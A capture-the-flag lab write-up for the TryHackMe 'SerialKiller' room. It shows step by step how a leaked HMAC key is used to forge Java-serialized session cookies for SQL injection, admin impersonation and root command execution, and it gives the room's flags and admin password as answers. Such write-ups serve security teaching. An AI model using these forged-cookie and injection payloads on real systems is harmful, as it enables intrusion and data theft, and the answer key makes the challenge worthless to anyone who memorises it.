# SerialKiller — TryHackMe Writeup

**Target:** `10.130.177.71` (HTTP/80)
**Stack:** Java `com.sun.net.httpserver` + H2 in-memory DB + HMAC-SHA256-signed, Java-serialized session cookie

---

## Answers

| Question | Answer |
|---|---|
| What is the first flag? | `THM{ac4cd13dcc6da590}` |
| What is the administrator's password? | `4dm1n_Xy9qL2v7rEa` |
| What is the root flag? | `THM{e41f987bebcf866c}` |

---

## 1. Recon — the app hands you the source

`GET /` returns a store page with a leaked DevOps comment:

```html
<!-- DevOps note: pre-prod source + config backup staged under /backup/
     (UserSession.java, ProductTemplate.java, ReportTask.java, app-config.properties.bak).
     REMOVE BEFORE PRODUCTION. -->
```

Fetching `/backup/app-config.properties.bak` gives the **HMAC signing key**:

```
serialvault.session-key=zj0vETmPJ1S81pC4DMcFS86nkvLhGB36
serialvault.report.spool=/var/spool/serialvault
```

The three `/backup/*.java` files reveal the three allowlisted, serializable classes:

```java
// UserSession (uid 101)  -> fields: username, role, issuedAt
public class UserSession implements Serializable { ... isAdmin() { return "admin".equalsIgnoreCase(role); } }

// ProductTemplate (uid 202) -> field: id   ; readObject() runs:
//   SELECT ... FROM products WHERE category = '<id>'      <-- SQL injection SINK
public class ProductTemplate implements Serializable { ... }

// ReportTask (uid 303) -> fields: command, reportName ; readObject() runs:
//   new ProcessBuilder("/bin/sh","-c",command).start()   <-- RCE SINK
public class ReportTask implements Serializable { ... }
```

The server's deserialization allowlist (`HardenedObjectInputStream`) permits only
`com.serialvault.model.*`, `java.lang.*` and `java.util.*` — so **ysoserial gadget
chains are rejected**. The bypass is to abuse the app's *own* classes above.

---

## 2. Reverse the cookie format

Login (`oranos` / `serialkiller`) sets:

```
sv_session = <base64(java-serialized-object)>.<base64(HMAC-SHA256)>
```

The HMAC is computed over the **base64 string itself** (verified byte-for-byte):

```python
hmac.new(KEY, b64_str.encode(), hashlib.sha256).digest()   # == signature
```

`sv.py` (in this folder) hand-crafts the Java serialization bytes for each class and
re-signs — it reproduces the server's own cookie exactly (round-trip MATCH).

---

## 3. Stage 1 — SQL sink → first flag

`GET /my-account` deserializes the cookie; if the object is a `ProductTemplate` it
calls `getPreview()`, which executes the SQL and renders the result. Forge a
`ProductTemplate` cookie whose `id` is an injection:

```
sv_session = sign(ProductTemplate( id = "x' UNION SELECT 1, secret_value, 'c',0,0,'s','d',0 FROM vault_secrets -- " ))
```

`/my-account` renders: `THM{ac4cd13dcc6da590}`

Same trick dumps the `users` table:

```
1|oranos|serialkiller|user  |  2|administrator|4dm1n_Xy9qL2v7rEa|admin
```

→ **administrator's password = `4dm1n_Xy9qL2v7rEa`** (login also confirms: returns an
`admin`-role session cookie).

---

## 4. Stage 2 — forge an admin session (different class)

Forge a `UserSession` with `role="admin"` and re-sign. `/admin` then returns 200
(non-admin gets `403 - admin session required`).

---

## 5. Stage 3 — RCE sink → root flag

The admin panel (`/admin`) says:

> Submit a signed, serialized `ReportTask` to `POST /admin/report`
> (field `task` = base64 of the signed object). Output is written to the internal
> spool... `GET /spool/<reportName>.out`

Forge a signed `ReportTask` and POST it:

```
task = sign(ReportTask(command = "cat /root/flag.txt", reportName = "r1"))
POST /admin/report   (Cookie: sv_session=<admin>)
GET  /spool/r1.out   ->  THM{e41f987bebcf866c}
```

Runs as **root** (`uid=0`), per the systemd unit:
`# Tourne en root : le Stage 3 (RCE) doit pouvoir lire /root/flag.txt.`

---

## Notes / decoys

- `/etc/systemd/system/serialkiller.service` exposes `SV_FLAG_STAGE2=THM{ac4cd13dcc6da590}`
  (same value as `vault_secrets.stage2_flag`).
- `Server.class` also contains a fallback constant
  `SERIALKILLER{cu5t0m_g4dg3t_sql1_n0_ys0s3r1al}` — the *default* for `SV_FLAG_STAGE2`
  if the env var were unset. It is **not** the live flag (format doesn't match the
  expected `***{****************}`).
